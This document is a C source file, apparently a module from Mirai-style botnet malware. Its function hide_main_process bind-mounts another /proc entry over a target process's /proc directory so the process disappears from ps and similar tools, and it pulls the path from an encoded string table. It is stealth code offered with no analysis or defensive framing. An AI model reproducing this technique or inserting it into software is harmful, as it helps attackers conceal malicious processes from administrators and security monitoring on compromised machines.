#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <sys/mount.h>
#include <unistd.h>
#include <dirent.h>
#include <string.h>
#include <sys/stat.h>

#include "includes.h"
#include "rand.h"
#include "util.h"
#include "table.h"

void itoa(int num, char *str, int base) 
{
    int i = 0;
    int is_negative = 0;

    if (num == 0) 
    {
        str[i++] = '0';
        str[i] = '\0';
        return;
    }

    if (num < 0 && base == 10) 
    {
        is_negative = 1;
        num = -num;
    }

    while (num != 0) 
    {
        int rem = num % base;
        str[i++] = (rem > 9) ? (rem - 10) + 'a' : rem + '0';
        num /= base;
    }

    if (is_negative) 
    {
        str[i++] = '-';
    }

    str[i] = '\0';

    for (int start = 0, end = i - 1; start < end; start++, end--) 
    {
        char temp = str[start];
        str[start] = str[end];
        str[end] = temp;
    }
}

int directory_exists(const char *path) 
{
    struct stat st;
    return (stat(path, &st) == 0 && S_ISDIR(st.st_mode));
}

int hide_main_process(int pid) 
{
    char proc_path[64];
    char target_path[64];
    char random_proc_str[10] = {0};
    char pid_str[10] = {0};
    int retry_count = 5;

    srand(time(NULL));

    strcpy(proc_path, enc[PROC_DIR].string);
    strcpy(target_path, enc[PROC_DIR].string);

    itoa(pid, pid_str, 10);
    strcat(target_path, pid_str);

    if (!directory_exists(target_path)) 
    {
#ifdef DEBUG
        printf("[bind] Target /proc entry %s does not exist.\n", target_path);
#endif
        return -1;
    }

    while (retry_count--) 
    {
        int random_proc = (rand_next() % 85) + 10;

        itoa(random_proc, random_proc_str, 10);

        strcpy(proc_path, enc[PROC_DIR].string);
        strcat(proc_path, random_proc_str);

        if (directory_exists(proc_path)) 
        {
            if (mount(proc_path, target_path, NULL, MS_BIND, NULL) != -1) 
            {
#ifdef DEBUG
                printf("[bind] Successfully hid process %d using /proc/%d\n", pid, random_proc);
#endif
                return 1;
            }
            else
            {
                return 0;
                exit(1);
            }
        }
    }
    return -1;
}
